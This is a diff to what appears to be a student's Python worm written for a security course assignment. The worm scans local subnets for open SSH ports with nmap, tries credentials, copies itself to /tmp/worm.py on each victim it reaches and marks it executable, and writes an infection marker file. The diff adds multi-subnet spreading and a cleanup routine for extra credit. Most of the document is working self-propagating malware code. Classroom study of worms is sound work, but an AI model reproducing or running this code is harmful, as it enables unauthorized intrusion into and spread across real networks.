@@ -64,8 +64,12 @@ def spreadAndExecute(sshClient):
     # code we used for an in-class exercise.
     # The code which goes into this function
     # is very similar to that code.
-    
-    sftp = sshClient.open_sftp() # Open the sftp object
+
+    sftp = sshClient.open_sftp() # Open the file transfer object
+
+    infectedFile = sftp.file(INFECTED_MARKER_FILE, 'w') # Write /tmp/infected.txt to infected hosts
+    infectedFile.close()
+
     sftp.put("worm.py", "/tmp/worm.py") # Place the file and the directory in the sftp object
     sshClient.exec_command("chmod a+x /tmp/worm.py") # Execute the infection on a Virtual Machine
 
@@ -73,6 +77,21 @@ def spreadAndExecute(sshClient):
     sshClient.close() # Close the ssh client object
     # pass
 
+""" EXTRA CREDIT 1: CLEANER FUNCTION """
+###############################################################
+# Clean the other hosts by removing the worm program and 
+# infected.txt 
+# @param sshClient - the instance of the SSH client connected
+# to the victim system
+###############################################################
+def cleanUp(sshClient):
+    sftp = sshClient.open_sftp()         # Initiate file transfer
+
+    sftp.remove("/tmp/worm.py")          # Remove the required objects
+    sftp.remove(INFECTED_MARKER_FILE)
+
+    sftp.close()                         # Close the file transfer
+    sshClient.close()                    # Close the ssh client
 
 ############################################################
 # Try to connect to the given host given the existing
@@ -155,7 +174,7 @@ def attackSystem(host):
         # Call tryCredentials and assigned the returned value to attemptResults
         attemptResults = tryCredentials(host, username, password, ssh) 
         if attemptResults == 0:
-            print("System succesfully connected to " + host)
+            print("Succesfully infected " + host)
             return ssh # Return the value of the ssh client
         elif attemptResults == 1:
             print("Error. Invalid credentials")
@@ -176,6 +195,7 @@ def getMyIP(interface):
     
     # TODO: Change this to retrieve and
     # return the IP of the current system.
+
     ipAddr = None # IP address
 
     # For loop: Repeat until all interfaces have been gone through
@@ -205,6 +225,14 @@ def getHostsOnTheSameNetwork():
     portScanner = nmap.PortScanner()    # Create an instance of the 'port scanner' class
 
     portScanner.scan('10.0.0.0/24', arguments='-p 22 --open') # Scan the network for systems with an open port 22
+
+    """ EXTRA CREDIT 2: Multi Spread """
+    # If user includes '-m' or '--multi' in the command when running worm.py,
+    # then the program will spread the worm infection to hosts on the network
+    # by scanning for hosts on the network '10.0.1.0/24' and adding the host
+    # info to the list of live hosts alongside the ones in the network '10.0.0.0/24'
+    if  "-m" in sys.argv or "--multi" in sys.argv:
+        portScanner.scan('10.0.1.0/24', arguments='-p 22 --open')
 
     hostData = portScanner.all_hosts()     # Scan the network for a host and assign the value to hostData
     
@@ -241,8 +269,9 @@ if len(sys.argv) < 2:
     # pass
 
 # TODO: Get the IP of the current system
-networkInfterfaces = netifaces.interfaces()         # Get all of the network interfaces on the system
+networkInfterfaces = netifaces.interfaces()   # Get all of the network interfaces on the system
 myIP = getMyIP(networkInfterfaces)       # Call the getMyIP function to retrieve the IP address
+print('The IP of the current system is ' + myIP)
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork() # Assign the returned value of getHostsOnTheSameNetwork() to networkHosts
@@ -250,7 +279,8 @@ networkHosts = getHostsOnTheSameNetwork() # Assign the returned value of getHost
 # TODO: Remove the IP of the current system
 # from the list of discovered systems (we
 # do not want to target ourselves!).
-networkHosts.remove(myIP)      # Remove the value of myIP from networkHosts
+print("Removing current IP from host list...\n")
+networkHosts.remove(myIP)      # Remove the current value of myIP from networkHosts
 
 print ("Found hosts: ", networkHosts)
 
@@ -266,12 +296,24 @@ for host in networkHosts:
     
     # Did the attack succeed?
     if sshInfo:
-        
-        print("Trying to spread")
-        
-        # Infect that system
-        spreadAndExecute(sshInfo[0])
-        
-        print("Spreading complete")	
+        # EC 1 Attempt: If the user includes '-c' or '--clean' when running the program,
+        # a cleanup will be executed by calling a function called CleanUp(). The function will
+        # operate similarly to SpreadAndExecute() only instead of initiating the worm attack on
+        # other hosts, it will initiate a cleanup protocol.
+        if  "-c" in sys.argv or "--clean" in sys.argv:
+            print("Trying to clean")
+
+            # Clean the system
+            cleanUp(sshInfo[0])
+
+            print("Cleanup complete")
+
+        else:
+            print("Trying to spread")
+            
+            # Infect that system
+            spreadAndExecute(sshInfo[0])
+            
+            print("Spreading complete")	
     
 
